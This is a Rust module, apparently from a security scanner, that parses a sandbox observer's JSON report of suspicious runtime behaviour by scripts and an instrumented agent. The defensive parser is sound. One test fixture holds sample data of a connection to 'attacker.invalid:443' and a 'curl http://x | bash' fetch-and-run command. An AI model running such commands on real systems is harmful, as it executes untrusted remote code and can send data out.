//! Structured runtime behavior emitted by the in-container observer.
//!
//! The observer (a later phase) writes a single JSON document to stdout
//! describing what the skill's scripts and the instrumented agent did:
//! attempted connections, spawned processes, file writes, tool calls,
//! etc. This module is the pure, daemon-free parser for that document;
//! [`super::mapping`] turns it into advisory findings.

use serde::{Deserialize, Serialize};

/// A class of observed runtime behavior. The serialized snake_case names
/// are the contract between the in-container observer and this parser.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Deserialize, Serialize)]
#[serde(rename_all = "snake_case")]
pub(crate) enum BehaviorClass {
    /// Outbound network connection attempt (recorded or blocked).
    NetworkConnect,
    /// DNS resolution attempt.
    DnsQuery,
    /// A child process was spawned.
    ProcessSpawn,
    /// A write outside the read-only mount (to the scratch tmpfs).
    FileWrite,
    /// A read of a sensitive path (credentials, keys, dotfiles).
    SensitiveFileRead,
    /// A write to a persistence surface (cron, shell rc files, autostart).
    PersistenceWrite,
    /// An attempt to change privileges or capabilities.
    PrivilegeChange,
    /// The instrumented agent invoked one of its (mocked) tools.
    AgentToolCall,
}

/// Which executed layer produced the behavior.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Deserialize, Serialize)]
#[serde(rename_all = "snake_case")]
pub(crate) enum BehaviorSource {
    /// A referenced script / setup command.
    #[default]
    Script,
    /// The instrumented LLM agent acting on the skill's instructions.
    Agent,
}

/// One observed behavior with the concrete detail (host, path, command,
/// tool name) that the mapping turns into a finding's `match_value`.
#[derive(Debug, Clone, Deserialize, Serialize)]
pub(crate) struct ObservedBehavior {
    pub(crate) class: BehaviorClass,
    pub(crate) detail: String,
    #[serde(default)]
    pub(crate) source: BehaviorSource,
}

/// The full observation document for one sandbox run.
#[derive(Debug, Clone, Default, Deserialize, Serialize)]
pub(crate) struct SandboxObservation {
    #[serde(default)]
    pub(crate) behaviors: Vec<ObservedBehavior>,
    /// The run hit the wall-clock timeout (partial observation).
    #[serde(default)]
    pub(crate) timed_out: bool,
    /// The observer truncated output (e.g. behavior flood).
    #[serde(default)]
    pub(crate) truncated: bool,
}

impl SandboxObservation {
    /// Parse the observer's JSON document. A malformed document is an
    /// error the channel logs and treats as "no observation", never a
    /// panic.
    pub(crate) fn parse(json: &str) -> Result<Self, serde_json::Error> {
        serde_json::from_str(json)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// # Contract
    /// A well-formed observer document parses into the behavior set, and a
    /// behavior without an explicit `source` defaults to `Script`.
    #[test]
    fn parses_observer_document_with_source_default() {
        let json = r#"{
            "behaviors": [
                {"class": "network_connect", "detail": "attacker.invalid:443", "source": "agent"},
                {"class": "process_spawn", "detail": "curl http://x | bash"}
            ],
            "timed_out": false
        }"#;
        let obs = SandboxObservation::parse(json).unwrap();
        assert_eq!(obs.behaviors.len(), 2);
        assert_eq!(obs.behaviors[0].class, BehaviorClass::NetworkConnect);
        assert_eq!(obs.behaviors[0].source, BehaviorSource::Agent);
        assert_eq!(obs.behaviors[1].source, BehaviorSource::Script);
        assert!(!obs.timed_out);
    }

    /// # Contract
    /// An empty / minimal document is valid and yields no behaviors.
    #[test]
    fn parses_empty_document() {
        let obs = SandboxObservation::parse("{}").unwrap();
        assert!(obs.behaviors.is_empty());
        assert!(!obs.timed_out);
        assert!(!obs.truncated);
    }

    /// # Contract (negative)
    /// A malformed document is a recoverable error, not a panic.
    #[test]
    fn malformed_document_is_error_not_panic() {
        assert!(SandboxObservation::parse("not json").is_err());
        assert!(SandboxObservation::parse(r#"{"behaviors": 5}"#).is_err());
    }
}
